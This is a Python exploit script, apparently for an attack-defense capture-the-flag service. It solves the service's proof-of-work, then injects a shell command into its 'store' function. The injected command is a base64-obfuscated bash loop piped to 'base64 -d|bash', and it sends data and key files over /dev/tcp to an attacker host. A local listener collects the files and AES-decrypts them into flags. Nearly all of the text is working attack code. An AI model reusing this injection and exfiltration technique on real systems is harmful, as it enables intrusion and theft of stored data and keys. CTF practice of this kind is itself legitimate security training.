#!/usr/bin/env python3

import sys
import telnetlib
import hashlib
import threading
from socket import *
import base64
import random
from pprint import pprint
import re

from Crypto.Cipher import AES


HOST = 'localhost'
PORT = 10002
REVERSE_SHELL_TARGET = '192.168.0.2'

tn = telnetlib.Telnet(HOST, PORT)
serversock = None
data = None


def main():
	ready_port = threading.Event()
	ready_data = threading.Event()
	thread = threading.Thread(target=server, args=(ready_port, ready_data))
	thread.start()
	ready_port.wait() # wait until server started to get random port for exploit
	init()
	exploit_data()
	ready_data.wait()
	get_flags()


def server(ready_port, ready_data):
	global serversock, data
	serversock = socket(AF_INET, SOCK_STREAM)
	serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	serversock.setblocking(False)
	serversock.settimeout(10)
	serversock.bind(('', 0))
	serversock.listen()
	ready_port.set()
	print(serversock.getsockname()[1])

	chunks = []

	# Two nested loops:
	# Outer loop: Accept multiple connections (for each flag file)
	# Inner loop: Accept mutlipe chunks of data
	# Each loop gets terminated by seperate timeouts
	try:
		while True:
			clientsock, addr = serversock.accept()
			clientsock.setblocking(False)
			clientsock.settimeout(1)

			try:
				while True:
					chunk = clientsock.recv(1024)

					if chunk != b'':
						chunks.append(chunk)
					else:
						break
			except timeout:
				pass
	except timeout:
		pass

	data = b''.join(chunks)
	ready_data.set()


def init():
	r = tn.read_until(b'yellow-submarine$ ')
	print(r.decode())
	tn.write(b'keygen\n')
	r = tn.read_until(b'>')
	if 'proof-of-work challenge' in r.decode():
		challenge = r.decode().split(':', 1)[1].split('\n', 1)[0].strip().rstrip('.')
	print(r.decode())
	print(challenge)
	response = pow(challenge)
	tn.write(str(response).encode() + b'\n')
	r = tn.read_until(b'yellow-submarine$ ')
	print(r.decode())


def pow(challenge):
	challenge, prefix = challenge.split('|')
	i = 0

	while True:
		if hashlib.sha256((prefix + str(i)).encode()).hexdigest().startswith(challenge):
			print(i)
			break

		i += 1
	
	return i


def exploit_data():
	tn.write(b'store\n')
	r = tn.read_until(b'>')
	print(r.decode())
	port = serversock.getsockname()[1]
	e = str(random.randint(10000, 99999)) + ';'
	e += 'echo '
	# Note: Insert IP of exploit server
	# Note: Maybe a tar cJf - of all data is more easy
	#b = 'ls >& /dev/tcp/{}/{} 0>&1'.format(REVERSE_SHELL_TARGET, port)
	b = "for f in $(ls -1 | grep -E '^data_[a-z0-9-]{{36}}(\.key)?$'); do echo \"$f\" >& /dev/tcp/{target}/{port} 0>&1; cat \"$f\" >& /dev/tcp/{target}/{port} 0>&1; done".format(target=REVERSE_SHELL_TARGET, port=port)
	print(b)
	e += base64.b64encode(b.encode()).decode()
	e += '|base64 -d|bash'
	e += '\n'
	print(e)
	tn.write(e.encode())
	r = tn.read_until(b'> ')
	print(r.decode())
	tn.write(base64.b64encode(b'') + b'\n')
	r = tn.read_until(b'yellow-submarine$ ')
	token = r.splitlines()[1]
	print(r.decode())
	tn.write(b'read\n')
	r = tn.read_until(b'> ')
	print(r.decode())
	tn.write(token + b'\n')
	r = tn.read_until(b'yellow-submarine$ ')
	print(r.decode())


def get_flags():
	global data

	#with open('data', 'rb') as f:
	#	data = f.read()

	flags_encrypted = {}
	flags_keys = {}

	offset = 0
	last_offset = 0

	name_pattern = re.compile(b'(.*)(data_[a-f0-9-]{36}(\.key)?)\n')
	last_name = None

	# Parse data (assign ciphertext and key to according dicts)
	while offset < len(data):
		buf = data[last_offset:offset]
		match = re.search(name_pattern, buf)

		if match:
			chunk = match.group(1)
			name = match.group(2).decode()

			if last_name is not None:
				if last_name.endswith('.key'):
					flags_keys[last_name] = chunk
				else:
					flags_encrypted[last_name] = chunk

			last_name = name
			last_offset = offset

		offset += 1

	for name, ciphertext in flags_encrypted.items():
		name_key = name + '.key'

		if name_key in flags_keys and len(ciphertext) % 16 == 0:
			key = flags_keys[name_key]

			if len(key) in [16, 24, 32]:
				cipher = AES.new(key, AES.MODE_CBC, '\x00' * 16)
				plaintext = cipher.decrypt(ciphertext)
				flag_pattern = re.compile(b'FLG[0-9A-Za-z]{13}')
				match = re.match(flag_pattern, plaintext)

				if match:
					print(match.group(0).decode())


if __name__ == '__main__':
	main()
	#pow(sys.argv[1])
	#exploit()
	#get_flags()
